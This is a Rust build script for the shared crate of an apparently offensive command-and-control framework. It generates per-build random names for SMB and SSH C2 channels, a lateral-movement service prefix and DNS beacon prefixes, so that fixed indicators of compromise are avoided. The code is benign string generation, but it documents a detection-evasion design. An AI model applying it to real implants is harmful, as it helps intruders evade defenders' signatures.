//! Build script for the `common` crate.
//!
//! Generates per-build randomised IoC (Indicator of Compromise) strings that
//! are compiled into both the agent and the server.  The strings are derived
//! deterministically from a seed so that both sides produce the same values.
//!
//! Seed source (first available wins):
//!   1. `ORCHESTRA_IOC_SEED` environment variable (hex-encoded u64)
//!   2. Auto-generated from thread RNG
//!
//! The seed is emitted back as `cargo:rustc-env` so that downstream build
//! tooling can capture it for reproducible builds.

use std::env;
use std::fs;
use std::path::Path;

// ── Minimal seeded PRNG (Xoshiro256++) ────────────────────────────────────────

struct Xoshiro256 {
    s: [u64; 4],
}

impl Xoshiro256 {
    fn from_seed(seed: u64) -> Self {
        // SplitMix64 to expand the u64 seed into 4 × u64 state
        let mut z = seed;
        let mut next = || {
            z = z.wrapping_add(0x9e3779b97f4a7c15);
            let mut x = z;
            x = (x ^ (x >> 30)).wrapping_mul(0xbf58476d1ce4e5b9);
            x = (x ^ (x >> 27)).wrapping_mul(0x94d049bb133111eb);
            x ^ (x >> 31)
        };
        Xoshiro256 {
            s: [next(), next(), next(), next()],
        }
    }

    fn next(&mut self) -> u64 {
        let result = self.s[0]
            .wrapping_add(self.s[3])
            .wrapping_add(self.s[1] << 17);
        let t = self.s[1] << 9;
        self.s[2] ^= self.s[0];
        self.s[3] ^= self.s[1];
        self.s[1] ^= self.s[2];
        self.s[0] ^= self.s[3];
        self.s[2] ^= t;
        self.s[3] = self.s[3].rotate_left(11);
        result
    }

    /// Generate a random alphanumeric string of the given length.
    fn alphanumeric_string(&mut self, len: usize) -> String {
        const CHARSET: &[u8] = b"abcdefghijklmnopqrstuvwxyz0123456789";
        (0..len)
            .map(|_| {
                let idx = (self.next() as usize) % CHARSET.len();
                CHARSET[idx] as char
            })
            .collect()
    }

    /// Generate a random lowercase alphabetic string of the given length.
    fn alpha_string(&mut self, len: usize) -> String {
        const CHARSET: &[u8] = b"abcdefghijklmnopqrstuvwxyz";
        (0..len)
            .map(|_| {
                let idx = (self.next() as usize) % CHARSET.len();
                CHARSET[idx] as char
            })
            .collect()
    }
}

fn read_seed() -> u64 {
    if let Ok(raw) = env::var("ORCHESTRA_IOC_SEED") {
        if let Some(hex) = raw.strip_prefix("0x") {
            return u64::from_str_radix(hex, 16).unwrap_or_else(|_| fallback_seed());
        }
        return raw.parse().unwrap_or_else(|_| fallback_seed());
    }
    fallback_seed()
}

fn fallback_seed() -> u64 {
    use std::time::{SystemTime, UNIX_EPOCH};
    let t = SystemTime::now()
        .duration_since(UNIX_EPOCH)
        .unwrap_or_default();
    // Mix time with a hard-coded default so it's never zero but also not
    // fully predictable.  Operators should set ORCHESTRA_IOC_SEED for
    // reproducible / synchronised builds.
    t.as_nanos() as u64 ^ 0x4f52434853454344 // "ORCHASECD"
}

fn main() {
    let out_dir = env::var_os("OUT_DIR").unwrap();
    let dest_path = Path::new(&out_dir).join("ioc_strings.rs");

    let seed = read_seed();

    // Emit the seed so build tooling can capture it.
    println!("cargo:rustc-env=ORCHESTRA_IOC_SEED={:#018x}", seed);

    let mut rng = Xoshiro256::from_seed(seed);

    // Generate IoC strings with different domain-separated seeds.
    //
    // 1. Named pipe name:     10 alphanumeric chars (e.g. "k7m2qx9p4j")
    // 2. SSH subsystem name:  12 alphanumeric chars (e.g. "m3n8rt2v5q7w")
    // 3. Service prefix:       4 alpha chars       (e.g. "wqxf")
    // 4. DNS beacon prefix:    8 alphanumeric chars (e.g. "b4k9z2x7")

    // Each string is derived from a domain-separated sub-seed so that changing
    // one label doesn't affect the others.
    let pipe_name = derive_ioc_string(&mut rng, b"ioc_pipe_name", 10, false);
    let ssh_subsystem = derive_ioc_string(&mut rng, b"ioc_ssh_subsystem", 12, false);
    let service_prefix = derive_ioc_string(&mut rng, b"ioc_service_prefix", 4, true);
    let dns_beacon_prefix = derive_ioc_string(&mut rng, b"ioc_dns_beacon", 8, false);
    let dns_task_prefix = derive_ioc_string(&mut rng, b"ioc_dns_task", 8, false);

    let code = format!(
        "/// Auto-generated IoC strings — DO NOT EDIT.\n\
         /// Seed: {seed:#018x}\n\
         ///\n\
         /// Regenerate with: ORCHESTRA_IOC_SEED={seed:#018x} cargo build\n\n\
         /// Named pipe name for SMB C2 (replaces hardcoded \"orchestra\").\n\
         pub const IOC_PIPE_NAME: &str = \"{pipe_name}\";\n\n\
         /// SSH subsystem name for SSH C2 (replaces hardcoded \"orchestra\").\n\
         pub const IOC_SSH_SUBSYSTEM: &str = \"{ssh_subsystem}\";\n\n\
         /// Windows service name prefix for lateral movement (replaces \"orch_\").\n\
         pub const IOC_SERVICE_PREFIX: &str = \"{service_prefix}\";\n\n\
         /// DNS query prefix for DoH beacon requests (replaces \"beacon\").\n\
         pub const IOC_DNS_BEACON: &str = \"{dns_beacon_prefix}\";\n\n\
         /// DNS query prefix for DoH task requests (replaces \"task\").\n\
         pub const IOC_DNS_TASK: &str = \"{dns_task_prefix}\";\n"
    );

    fs::write(&dest_path, code).expect("failed to write ioc_strings.rs");

    // Rerun if the seed changes.
    println!("cargo:rerun-if-env-changed=ORCHESTRA_IOC_SEED");
}

/// Derive an IoC string by advancing the PRNG state with a domain separator.
fn derive_ioc_string(rng: &mut Xoshiro256, domain: &[u8], len: usize, alpha_only: bool) -> String {
    // Mix domain into PRNG state for domain separation
    let mut mix: u64 = 0xcbf29ce484222325; // FNV-1a offset basis
    for &b in domain {
        mix ^= b as u64;
        mix = mix.wrapping_mul(0x100000001b3);
    }
    // Advance PRNG by domain-mixed amount
    for _ in 0..(mix % 8 + 4) {
        rng.next();
    }

    if alpha_only {
        rng.alpha_string(len)
    } else {
        rng.alphanumeric_string(len)
    }
}
